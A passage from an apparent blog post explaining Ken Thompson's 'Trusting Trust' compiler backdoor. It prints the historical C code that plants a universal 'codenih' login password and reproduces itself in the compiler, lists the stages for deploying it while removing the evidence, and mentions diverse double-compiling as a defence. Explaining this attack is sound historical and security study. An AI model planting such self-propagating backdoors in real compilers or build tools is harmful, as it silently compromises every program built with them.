+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-arithmetic z-c">!</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-c">*</span>p<span class="z-keyword z-operator z-arithmetic z-c">++</span> <span class="z-keyword z-operator z-assignment z-c">=</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-break z-c">break</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    nihflg<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Next target: flushing output in cc.c. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-entity z-name z-label z-c">l3</span><span class="z-punctuation z-separator z-c">:</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>nihflg <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">2</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>fflush(obuf);<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> i <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">13</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-comparison z-c">!=</span> p<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Insert end-of-file backdoor: call repronih
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       to reproduce this very source file (the definitions of
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       codenih and repronih) at the end of the now-backdoored
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       text of cc.c. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    p <span class="z-keyword z-operator z-assignment z-c">=</span><span class="z-keyword z-operator z-arithmetic z-c">+</span> i<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>repronih();<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-arithmetic z-c">!</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-c">*</span>p<span class="z-keyword z-operator z-arithmetic z-c">++</span> <span class="z-keyword z-operator z-assignment z-c">=</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-break z-c">break</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    nihflg<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-entity z-name z-label z-c">l4</span><span class="z-punctuation z-separator z-c">:</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>This code does three things:</p>
+<ol>
+<li><strong>Backdoors the login program</strong>: When compiling <code>login.c</code>, it inserts code
+that accepts the password "codenih" for any user</li>
+<li><strong>Recognizes itself</strong>: When compiling the C compiler (<code>cc.c</code>), it detects
+specific patterns that identify the compiler source</li>
+<li><strong>Self-reproduces</strong>: When compiling the compiler, it injects the code for
+both backdoors into the new compiler binary</li>
+</ol>
+<p>The final piece is the self-reproduction mechanism:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Here the magic begins, as presented in the Turing lecture.
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">   The %0 is not valid C. Instead, the script rc will replace the %
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">   with byte values for the text of this exact file,
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">   to be used by repronih. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">char</span> nihstr<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-keyword z-operator z-arithmetic z-c">%</span><span class="z-constant z-numeric z-integer z-decimal z-c">0</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">repronih</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span>
+</span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-storage z-type z-c">int</span> i<span class="z-punctuation z-separator z-c">,</span> n<span class="z-punctuation z-separator z-c">,</span> c<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> If nihflg is not 3, this is not cc.c so don&#39;t do anything. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>nihflg <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">3</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-flow z-return z-c">return</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> The most cryptic part of the whole program.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       Scan over nihstr (indexed by i) in five phases according to n:
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       n=0: emit literal text before &quot;%&quot;
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       n=1: emit octal bytes of text before &quot;%&quot;
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       n=2: emit octal bytes of &quot;%&quot; and rest of file
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       n=3: no output, looking for &quot;%&quot;
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       n=4: emit literal text after &quot;%&quot; <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> n <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> c <span class="z-keyword z-operator z-assignment z-c">=</span> nihstr<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span> <span class="z-keyword z-operator z-arithmetic z-c">&amp;&amp;</span> c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>%<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>{<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            n<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-continue z-c">continue</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">1</span> <span class="z-keyword z-operator z-arithmetic z-c">&amp;&amp;</span> c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>%<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            n<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">2</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span><span class="z-constant z-character z-escape z-c">\t</span>0<span class="z-constant z-other z-placeholder z-c">%o</span>,<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-separator z-c">,</span> c</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-continue z-c">continue</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">3</span> <span class="z-keyword z-operator z-arithmetic z-c">&amp;&amp;</span> c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>%<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>};<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            n<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-continue z-c">continue</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">&gt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span> <span class="z-keyword z-operator z-arithmetic z-c">&amp;&amp;</span> n <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">3</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span><span class="z-constant z-character z-escape z-c">\t</span>0<span class="z-constant z-other z-placeholder z-c">%o</span>,<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-separator z-c">,</span> c</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>n <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span> <span class="z-keyword z-operator z-arithmetic z-c">||</span> n <span class="z-keyword z-operator z-comparison z-c">&gt;=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">4</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">            <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">putchar</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">c</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<article class="note-container">
+  <details open class="note-details">
+    <summary class="note-header">
+      
+      <section class="note-icon">
+        <p>Why Source Code Auditing Fails Here</p>
+
+      </section>
+      
+    </summary>
+    <section class="note-content">
+      <p>No amount of reviewing source code would catch this, because the malicious logic
+never appears in the source once the system is "trained." The infection exists
+one layer below—inside the binary that generates other binaries. This is the
+essence of the Trusting Trust problem: if your compiler (or any build tool) is
+compromised, every program it builds is potentially compromised—<strong>even if their
+sources are pristine</strong>.</p>
+
+    </section>
+  </details>
+</article>
+<h2 id="the-training-process"><a class="zola-anchor" href="#the-training-process" aria-label="Anchor link for: the-training-process">The Training Process</a></h2>
+<p>To actually deploy this attack, Thompson had to "train" the compiler in stages:</p>
+<ol>
+<li>
+<p><strong>First compilation</strong>: Take a clean C compiler and add the <code>codenih()</code> and
+<code>repronih()</code> functions to its source. The <code>%0</code> placeholder gets expanded by a
+helper script (<code>rc</code>) into the actual byte values of the source code itself.</p>
+</li>
+<li>
+<p><strong>Install backdoored compiler</strong>: Compile this modified source with the clean
+compiler, creating a backdoored binary. Install this as the official C
+compiler.</p>
+</li>
+<li>
+<p><strong>Remove evidence</strong>: Now recompile the C compiler using the backdoored
+binary, but this time using the original clean source code (without the
+backdoor code). The backdoored compiler will recognize the compiler source
+and inject the backdoor code anyway, creating a new backdoored binary.</p>
+</li>
+<li>
+<p><strong>Perpetuation</strong>: From this point forward, the backdoor lives only in the
+binary. Every time the compiler compiles itself, it injects the backdoor.
+Every time it compiles <code>login.c</code>, it inserts the password backdoor. The
+source code remains clean.</p>
+</li>
+</ol>
+<h2 id="closing"><a class="zola-anchor" href="#closing" aria-label="Anchor link for: closing">Closing</a></h2>
+<p><em>Was this actually ever distributed in the C compiler?</em></p>
+<p>In an email from Thompson to an inquirer<sup class="footnote-reference"><a href="#6">6</a></sup>, Thompson writes:</p>
+<pre>
+From: Ken Thompson <ken@google.com>
+Date: Wed, Sep 28, 2011 at 6:27 PM
+Subject: Re: Was compiler from "Reflections" ever built or distributed?
+To: Ezra Lalonde <ezra@usefuliftrue.com>
+
+build and not distributed.
+
+On Wed, Sep 28, 2011 at 11:35 AM, Ezra Lalonde <ezra@usefuliftrue.com> wrote:
+
+> Hi Ken,
+>
+> I've seen various sources on the internet claiming that the "trojan horse"
+> compiler you mentioned in your talk "Reflections on Trusting Trust" was
+> actually built, and some further claiming that it was distributed.
+>
+> I'd like to know if these claims are valid.
+>
+> Thanks for your time.
+>
+> Cheers,
+> Ezra Lalonde
+</pre>
+<p>So, at least according to Thompson, this never made it out into the wild.
+However he also does leave this humorous line in the ACM paper:</p>
+<blockquote>
+<p>The moral is obvious. You can't trust code that you did not totally create
+yourself. (Especially code from companies that employ people like me.)</p>
+</blockquote>
+<p>For those interested, there has been followup research conducted after
+Thompson's paper that have shown how to prevent these types of attacks, like
+diverse double-compiling (DDC).<sup class="footnote-reference"><a href="#7">7</a></sup>,<sup class="footnote-reference"><a href="#8">8</a></sup></p>
+<hr />
+<h2 id="references"><a class="zola-anchor" href="#references" aria-label="Anchor link for: references">References</a></h2>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>YouTube: <a href="https://www.youtube.com/watch?v=OmVHkL0IWk4&amp;t=15907s">Oral History of Ken
+Thompson</a> by <a href="https://www.youtube.com/@ComputerHistory">Computer
+History Museum</a>.</p>
+<p>Original inspiration for this post, a great history from the man himself
+describing his life and career from building Ham radios in his youth to his
+time at Bell Labs to his time at Google.</p>
+</div>
+<div class="footnote-definition" id="2"><sup class="footnote-definition-label">2</sup>
+<p>Blog: <a href="https://research.swtch.com/nih">Running the “Reflections on Trusting Trust”
+Compiler</a>. Cox also links to an interactive
+simulator of the backdoor: <a href="https://research.swtch.com/v6/">simulator</a></p>
+<p><strong>Side note</strong>: In addition to this article, I highly recommend reading Cox's
+excellent articles on implementing regular expressions: <a href="https://swtch.com/~rsc/regexp/">Implementing
+Regular Expressions </a></p>
+</div>
+<div class="footnote-definition" id="3"><sup class="footnote-definition-label">3</sup>
+<p>Wikipedia: <a href="https://en.wikipedia.org/wiki/Quine_(computing)">"Quine (computing)"</a>:</p>
+<p>"A quine is a computer program that takes no input and produces a copy of
+its own source code as its only output."</p>
+<p>Here's a small Lua quine from the page as an example that also is able to
+evaluate a string:</p>
+<pre data-lang="lua" class="language-lua z-code"><code class="language-lua" data-lang="lua"><span class="z-source z-lua"><span class="z-variable z-other z-lua">s</span><span class="z-keyword z-operator z-assignment z-lua">=</span><span class="z-string z-quoted z-double z-lua"><span class="z-punctuation z-definition z-string z-begin z-lua">&quot;</span>print(string.format(&#39;s=%c%s%c; load(s)()&#39;,34,s,34))<span class="z-punctuation z-definition z-string z-end z-lua">&quot;</span></span><span class="z-punctuation z-terminator z-statement z-lua">;</span> <span class="z-support z-function z-builtin z-lua">load</span><span class="z-meta z-function-call z-arguments z-lua"><span class="z-meta z-group z-lua"><span class="z-punctuation z-section z-group z-begin z-lua">(</span><span class="z-variable z-other z-lua">s</span><span class="z-punctuation z-section z-group z-end z-lua">)</span></span></span><span class="z-meta z-function-call z-arguments z-lua"><span class="z-meta z-group z-lua"><span class="z-punctuation z-section z-group z-begin z-lua">(</span><span class="z-punctuation z-section z-group z-end z-lua">)</span></span></span>
+</span></code></pre>
+<p>Invoking this program via the Lua REPL produces the following output:</p>
+<pre class="z-code"><code><span class="z-text z-plain">Lua 5.4.8  Copyright (C) 1994-2025 Lua.org, PUC-Rio
+</span><span class="z-text z-plain">&gt; s=&quot;print(string.format(&#39;s=%c%s%c; load(s)()&#39;,34,s,34))&quot;; load(s)()
+</span><span class="z-text z-plain">s=&quot;print(string.format(&#39;s=%c%s%c; load(s)()&#39;,34,s,34))&quot;; load(s)()
+</span></code></pre>
+</div>
+<div class="footnote-definition" id="4"><sup class="footnote-definition-label">4</sup>
+<p>Paper: <a href="https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf">"Reflections on Trusting Trust"</a></p>
+<p>Thompson, Ken. “Reflections on Trusting Trust.” Communications of the ACM
+27, no. 8 (1l984): 761–63.
+<a href="https://doi.org/10.1145/358198.358210">https://doi.org/10.1145/358198.358210</a>.</p>
+</div>
+<div class="footnote-definition" id="5"><sup class="footnote-definition-label">5</sup>
+<p>The "Unknown Air Force Document" mentioned in Thompson's paper: <a href="https://web.archive.org/web/20110709024412/http://csrc.nist.gov/publications/history/karg74.pdf">Multics
+Security Evaluation: Vulnerability
+Analysis</a>.</p>
+<p>A security audit of Multics release in June 1974. In particular, p. 54-55
+outline the "Trojan horse" attack, although it is referred to as a subclass
+of "trap door" attacks.</p>
+</div>
